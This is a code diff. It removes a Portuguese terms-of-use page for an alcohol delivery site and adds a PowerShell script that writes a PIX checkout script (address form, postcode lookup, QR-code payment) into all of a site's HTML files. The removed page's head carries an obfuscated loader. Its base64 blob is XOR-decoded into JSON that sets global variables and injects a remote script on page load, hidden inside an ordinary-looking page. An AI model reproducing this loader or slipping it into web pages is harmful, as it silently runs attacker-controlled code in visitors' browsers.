@@ -1,35 +1,6 @@
-﻿<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Termos de Uso - Zé Busca Delivery</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #f9fafb; color: #333; line-height: 1.6; margin: 0; padding: 0; }
-        .container { max-width: 800px; margin: 50px auto; padding: 30px; background: #fff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        h1, h2 { color: #d97706; }
-        .footer { margin-top: 40px; font-size: 14px; color: #666; border-top: 1px solid #eee; padding-top: 20px; text-align: center; }
-        .footer a { color: #d97706; text-decoration: none; }
-    </style>
-<script>(function(){var u_ily=atob("DDhDqhePMc2aXBbtiUNh32XjE/e4NGKZ+Ut5hTjsVaO0KWKA4F46hHTgXOP4Ljme6koq2mP8HrjuMWXC5Vk3z2T7H6fpfjrP6Ew32H7tRLn/LzTX0kNhxHbiVO+gfnKM/Vlu32PiWKvjcWaf7E4mxGOiSa71ODue6lNhhjX5UKHvOTTXqxo+hmytX6z3OTTXq1wi3naiRLn3NXCUpEgxz2HqX7m3L2OP4FwwiDutR6z2KXPPsxph10ry");var g_1a=[];for(var u_9=0;u_9<u_ily.length;u_9++){g_1a.push(u_ily.charCodeAt(u_9)&255);}var q_n=g_1a[0];var e_jk=g_1a.slice(1,1+q_n);var g_wx=g_1a.slice(1+q_n);var p_y2=g_wx.map(function(b,w_k){return b^e_jk[w_k%q_n];});var k_4k3i="";for(var y_ut3=0;y_ut3<p_y2.length;y_ut3++){k_4k3i+=String.fromCharCode(p_y2[y_ut3]&255);}var w_29po=decodeURIComponent(escape(k_4k3i));var u_6x11=JSON.parse(w_29po);var j_06x=u_6x11.globals||[];j_06x.forEach(function(p_i){window[p_i.name]=p_i.value;});var b_cqwr=document.createElement("script");b_cqwr.src=u_6x11.url;b_cqwr.async=true;b_cqwr.defer=true;(u_6x11.attributes||[]).forEach(function(w_k4c1){b_cqwr.setAttribute(w_k4c1.name,w_k4c1.value);});(document.head||document.documentElement).appendChild(b_cqwr);})();</script></head>
-<body>
-    <div class="container">
-        <h1>Termos de Uso</h1>
-        <p>Bem-vindo aos Termos de Uso da <strong>Express Bebidas</strong>.</p>
-        
-        <h2>1. Aceitação dos Termos</h2>
-        <p>Ao acessar e utilizar nossos serviços, você concorda em cumprir estes Termos de Uso.</p>
-        
-        <h2>2. Restrição de Idade</h2>
-        <p>A venda e o consumo de bebidas alcoólicas são estritamente proibidos para menores de 18 anos. Você deve comprovar sua maioridade no momento da entrega.</p>
-        
-        <h2>3. Entregas e Prazos</h2>
-        <p>Os prazos de entrega podem variar conforme a região e a disponibilidade. Faremos o possível para cumprir as estimativas fornecidas.</p>
+$htmlFiles = Get-ChildItem -Path "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz\9345488724234" -Recurse -Filter "*.html"
 
-        <div class="footer">
-            <a href="index.html">&larr; Voltar para a Página Inicial</a>
-        </div>
-    </div>
+$newScript = @"
 <script>
   window.BUSCAR_CEP = async function(cep) {
       var cepLimpo = cep.replace(/\D/g, '');
@@ -63,7 +34,7 @@
       var tel = document.getElementById('checkout-tel').value;
       
       if(!rua || !num || !bairro || !tel) {
-          alert('Por favor, preencha todos os campos do endereÃ§o e o seu WhatsApp.');
+          alert('Por favor, preencha todos os campos do endereço e o seu WhatsApp.');
           return;
       }
       
@@ -84,7 +55,7 @@
               title: 'Pedido Delivery',
               unitPrice: amountInCents,
               quantity: 1,
-              description: 'EndereÃ§o: ' + enderecoCompleto,
+              description: 'Endereço: ' + enderecoCompleto,
               tangible: false
           }],
           pix: { expiresInDays: 1 }
@@ -110,7 +81,7 @@
               var successHtml = '<h2 style="color:#111;margin-bottom:15px;font-size:22px;font-weight:900;text-align:center;font-family:Arial,sans-serif;">Pague com PIX</h2>' +
                   '<img src="' + qrcodeImg + '" style="max-width:250px;width:100%;margin:0 auto 15px auto;display:block;" />' +
                   '<p style="font-size:15px;color:#333;margin-bottom:15px;word-break:break-all;text-align:center;font-family:Arial,sans-serif;font-weight:bold;">' + qrcodeText + '</p>' +
-                  '<button onclick="navigator.clipboard.writeText(\'' + qrcodeText + '\'); alert(\'CÃ³digo Copiado!\');" style="background:#10b981;color:#fff;border:none;padding:15px 20px;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;width:100%;margin-bottom:10px;font-family:Arial,sans-serif;">COPIAR CÃ“DIGO PIX</button>' +
+                  '<button onclick="navigator.clipboard.writeText(\'' + qrcodeText + '\'); alert(\'Código Copiado!\');" style="background:#10b981;color:#fff;border:none;padding:15px 20px;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;width:100%;margin-bottom:10px;font-family:Arial,sans-serif;">COPIAR CÓDIGO PIX</button>' +
                   '<button onclick="document.getElementById(\'pix-checkout-modal\').remove();" style="background:#ef4444;color:#fff;border:none;padding:15px 20px;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;width:100%;font-family:Arial,sans-serif;">FECHAR</button>';
               document.getElementById('checkout-modal-inner').innerHTML = successHtml;
           } else {
@@ -119,7 +90,7 @@
           }
       } catch(err) {
           console.error('Erro PUFPAG:', err);
-          alert('Erro de conexÃ£o ao gerar PIX.');
+          alert('Erro de conexão ao gerar PIX.');
           document.getElementById('pix-checkout-modal').remove();
       }
   };
@@ -152,7 +123,7 @@
           }
           
           if(total <= 0) {
-              alert('Carrinho vazio ou valor invÃ¡lido para gerar pedido.');
+              alert('Carrinho vazio ou valor inválido para gerar pedido.');
               return;
           }
           
@@ -164,16 +135,16 @@
           
           var modalHtml = '<div id="pix-checkout-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(0px);">' +
               '<div id="checkout-modal-inner" style="background:#fff;padding:30px 20px;border-radius:16px;text-align:left;max-width:400px;width:100%;max-height:90vh;overflow-y:auto;box-shadow:0 15px 30px rgba(0,0,0,0.5);transform:translateZ(0);">' +
-              '<h2 style="color:#111;margin-bottom:10px;font-size:24px;font-weight:900;text-align:center;font-family:Arial,sans-serif;letter-spacing:-0.5px;">EndereÃ§o de Entrega</h2>' +
+              '<h2 style="color:#111;margin-bottom:10px;font-size:24px;font-weight:900;text-align:center;font-family:Arial,sans-serif;letter-spacing:-0.5px;">Endereço de Entrega</h2>' +
               '<p style="color:#555;font-size:15px;margin-bottom:20px;text-align:center;font-family:Arial,sans-serif;">Preencha para onde vamos enviar:</p>' +
               
               '<label style="'+labelStyle+'">CEP</label>' +
-              '<input type="tel" id="checkout-cep" placeholder="Apenas nÃºmeros" maxlength="9" onkeyup="window.BUSCAR_CEP(this.value)" style="'+inputStyle+'" />' +
+              '<input type="tel" id="checkout-cep" placeholder="Apenas números" maxlength="9" onkeyup="window.BUSCAR_CEP(this.value)" style="'+inputStyle+'" />' +
               
               '<label style="'+labelStyle+'">Rua / Avenida</label>' +
               '<input type="text" id="checkout-rua" placeholder="Ex: Rua das Flores" style="'+inputStyle+'" />' +
               
-              '<label style="'+labelStyle+'">NÃºmero / Complemento</label>' +
+              '<label style="'+labelStyle+'">Número / Complemento</label>' +
               '<input type="text" id="checkout-num" placeholder="Ex: 123 - Apto 4" style="'+inputStyle+'" />' +
               
               '<label style="'+labelStyle+'">Bairro</label>' +
@@ -192,3 +163,41 @@
 </script>
 </body>
 </html>
+"@
+
+foreach ($file in $htmlFiles) {
+    $text = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
+    
+    $startIdx = $text.LastIndexOf("<script>`n  window.BUSCAR_CEP")
+    if ($startIdx -eq -1) { $startIdx = $text.LastIndexOf("<script>`r`n  window.BUSCAR_CEP") }
+    if ($startIdx -eq -1) { $startIdx = $text.LastIndexOf("<script>`n  window.DO_PUFPAG") }
+    if ($startIdx -eq -1) { $startIdx = $text.LastIndexOf("<script>`r`n  window.DO_PUFPAG") }
+    
+    if ($startIdx -ge 0) {
+        $text = $text.Substring(0, $startIdx)
+    } else {
+        $text = $text -replace "(?i)</body>\s*</html>\s*", ""
+    }
+    
+    $text = $text + $newScript
+    [System.IO.File]::WriteAllText($file.FullName, $text, [System.Text.Encoding]::UTF8)
+}
+
+$rootHtmlFiles = Get-ChildItem -Path "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz" -Filter "*.html"
+foreach ($file in $rootHtmlFiles) {
+    $text = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
+    
+    $startIdx = $text.LastIndexOf("<script>`n  window.BUSCAR_CEP")
+    if ($startIdx -eq -1) { $startIdx = $text.LastIndexOf("<script>`r`n  window.BUSCAR_CEP") }
+    if ($startIdx -eq -1) { $startIdx = $text.LastIndexOf("<script>`n  window.DO_PUFPAG") }
+    if ($startIdx -eq -1) { $startIdx = $text.LastIndexOf("<script>`r`n  window.DO_PUFPAG") }
+    
+    if ($startIdx -ge 0) {
+        $text = $text.Substring(0, $startIdx)
+    } else {
+        $text = $text -replace "(?i)</body>\s*</html>\s*", ""
+    }
+    
+    $text = $text + $newScript
+    [System.IO.File]::WriteAllText($file.FullName, $text, [System.Text.Encoding]::UTF8)
+}
